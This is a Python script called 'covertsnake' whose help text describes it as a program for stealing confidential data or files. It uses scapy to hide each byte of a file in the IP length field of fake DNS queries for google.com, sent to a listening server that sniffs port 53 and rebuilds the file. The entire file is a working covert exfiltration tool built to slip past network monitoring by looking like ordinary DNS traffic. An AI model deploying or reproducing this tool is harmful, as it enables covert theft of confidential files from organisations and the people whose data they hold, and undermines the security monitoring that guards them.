#!/bin/python3

import logging, os
from base64 import b64encode, b64decode
from random import randint
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR
from scapy.sendrecv import sniff, send
from scapy.arch import get_if_addr, conf
from sys import argv, exit
from tqdm import tqdm

try:
    if argv[1] == "--debug":
        logging.basicConfig(level=logging.DEBUG,format='\n%(asctime)s : %(message)s\n')
        logging.debug("debug mode enabled")
    else:
        logging.basicConfig(level=logging.INFO, format='\n%(asctime)s : %(message)s\n')
except:
    logging.basicConfig(level=logging.INFO, format='\n%(asctime)s : %(message)s\n')

local_ip = get_if_addr(conf.iface)
bp_filter = f"port 53"
client_mode = False
server_mode = False
yonking_in_prog = False


def print_help():
    print(
'''
covertsnake is a python program made for stealing confidential data or files in IP header of UDP DNS queries

THIS PROGRAM NEEDS TO BE RAN AS ROOT

Usage:
    sudo covertsnake.py --server
    sudo covertsnake.py --client --ip <server ip> --file <file name in the current directory>

Arguments:
    --help: displays this message
    --ip: server ip
    --file: the name of the file you want to transfer
    --server: runs the program in server mode
    --client: runs the program in client mode
    --debug: enables debug mode must be the first argument

Example:
    covertsnake.py --server
    sudo covertsnake.py --client --file example.pdf --ip 10.0.0.245
''')


def yonking(packet):
    global yonking_in_prog, file_name, yonked_data, yonked_hex
    logging.debug("got a new packet")
    logging.debug(packet.summary())
    domain_quaried = packet[DNSQR].qname
    if domain_quaried != b"google.com." and domain_quaried != b"google.ca.":
        yonking_in_prog = True
        logging.debug(f"downloading a new file named {domain_quaried} in 64bit")
        file_name = b64decode(domain_quaried)
        open(file_name, "a").close()
        logging.info(f"downloading a new file named {file_name}")
    elif domain_quaried == b"google.com." and yonking_in_prog == True:
        yonked_hex = packet[IP].len - 0xff
        logging.debug(f"got another hex byte {yonked_hex}")
        yonked_data.append(yonked_hex)
        logging.debug(f"total stolen data so far \n{yonked_data}")
    elif domain_quaried == b"google.ca." and yonking_in_prog == True:
        with open(file_name, "wb") as yonked_file:
            yonked_file.write(yonked_data)
        yonking_in_prog = False
        yonked_data = bytearray()
        logging.info("saved a new file")


while True:
    if not os.geteuid() == 0:
        exit("\nOnly root can run this program\n")
        break
    try:
        for argum in argv:
            logging.debug(argum)
            if argum == "--help":
                print_help()
                break
            elif argum == "--client":
                client_mode = True
            elif argum == "--server":
                server_mode = True
            elif argum == "--ip":
                server_ip = argv[argv.index("--ip")+1]
            elif argum == "--file":
                file_path = argv[argv.index("--file")+1]    
    except:
        print('invalid arguments!!')
        print_help()
        break

    if client_mode and server_mode:
        print('You cant use --server and --client at the same time.')
        print_help()
        break
    if server_mode == False and client_mode == False:
        print('invalid arguments!!')
        print_help()
        break
    else:
        break

if client_mode:
    logging.debug("in client mode")
    file_name64 = b64encode(bytes(file_path, 'utf-8'))
    logging.debug(f"file name in base64 is {file_name64}")
    send(IP(dst=server_ip)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=file_name64)), verbose=0)
    logging.debug("sent file name")
    with open(file_path, "rb") as yonking_file:
        yonking_data = yonking_file.read()
    logging.debug("read the file to be yonked")
    for hex_bit in tqdm (yonking_data, desc='Sending Packets...', unit=' Bytes'):
        hex_bit = hex_bit + 0xff
        send(IP(dst=server_ip, len=hex_bit)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="google.com")), verbose=0)
        logging.debug(f"sent {hex_bit} hex byte")
    send(IP(dst=server_ip)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="google.ca")), verbose=0)
    logging.debug(f"send the end message")

if server_mode:
    yonked_data = bytearray()
    logging.debug("in server mode")
    sniff(filter=bp_filter, prn=yonking)
